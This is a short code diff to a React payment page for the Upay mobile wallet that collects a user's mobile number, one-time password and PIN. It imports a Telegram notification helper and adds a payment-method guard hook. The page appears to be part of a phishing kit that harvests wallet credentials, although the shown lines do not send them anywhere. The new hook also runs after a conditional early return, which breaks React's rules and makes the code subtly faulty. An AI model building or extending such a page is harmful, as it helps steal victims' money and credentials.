@@ -1,12 +1,15 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
+import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import upayLogo from "@/assets/upay-logo-full.svg";
 
 const UpayPayment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
+  const checking = usePaymentMethodGuard("upay");
+  if (checking) return null;
   const [mobileNumber, setMobileNumber] = useState("");
   const [otp, setOtp] = useState("");
   const [pin, setPin] = useState("");
